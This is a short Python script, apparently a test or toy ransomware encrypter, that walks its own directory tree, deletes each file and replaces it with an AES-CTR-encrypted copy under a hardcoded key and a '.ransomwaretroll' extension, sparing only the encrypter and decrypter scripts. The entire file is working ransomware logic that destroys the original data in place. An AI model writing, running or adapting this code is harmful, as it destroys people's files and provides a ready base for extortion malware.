import os
import pyaes

# Get the current directory
current_directory = os.path.dirname(os.path.abspath(__file__))

# Encryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Define filenames to exclude from encryption
exclude_files = ["encrypter.py", "decrypter.py"]

# Traverse the directory tree
for root, dirs, files in os.walk(current_directory):
    for file_name in files:
        # Skip the encrypter and decrypter files
        if file_name in exclude_files:
            continue
        
        file_path = os.path.join(root, file_name)
        
        # Open the file to be encrypted
        with open(file_path, "rb") as file:
            file_data = file.read()
        
        # Remove the original file
        os.remove(file_path)
        
        # Encrypt the file
        crypto_data = aes.encrypt(file_data)
        
        # Save the encrypted file
        new_file_path = file_path + ".ransomwaretroll"
        with open(new_file_path, "wb") as new_file:
            new_file.write(crypto_data)
